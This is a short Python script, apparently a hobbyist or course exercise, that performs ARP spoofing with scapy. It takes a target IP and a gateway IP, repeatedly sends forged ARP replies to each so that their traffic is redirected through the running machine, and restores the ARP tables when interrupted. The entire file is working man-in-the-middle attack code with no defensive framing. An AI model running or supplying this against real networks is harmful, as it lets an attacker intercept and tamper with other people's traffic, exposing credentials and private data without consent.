#!/usr/bin/env/python

import time

import scapy.all as scapy

import optparse





def get_argument():

    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target_ip", help="Target IP Address")

    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP Address")

    options, arguments = parser.parse_args()

    if not options.target_ip:

        print("Please Specify Target IP. Use --help for more info")

        exit()

    if not options.gateway_ip:

        print("[-] Please Specify Gateway IP. Use --help for more info")

        exit()

    return options



def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc





def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    scapy.send(packet, verbose=False)





def restore(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)

    source_mac = get_mac(source_ip)

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    scapy.send(packet, count=4, verbose=False)





sent_packets_count = 0



args = get_argument()

target_ip = args.target_ip

gateway_ip = args.gateway_ip

try:

    while True:

        spoof(target_ip, gateway_ip)

        spoof(gateway_ip, target_ip)

        sent_packets_count = sent_packets_count + 2

        print("\r[+] Packets sent: " + str(sent_packets_count), end="")

        time.sleep(2)

except KeyboardInterrupt:

    print("\n[-] Ctrl + C detected...Restting ARP Tables.........Please Wait\n")

    restore(target_ip, gateway_ip)

    restore(gateway_ip, target_ip)
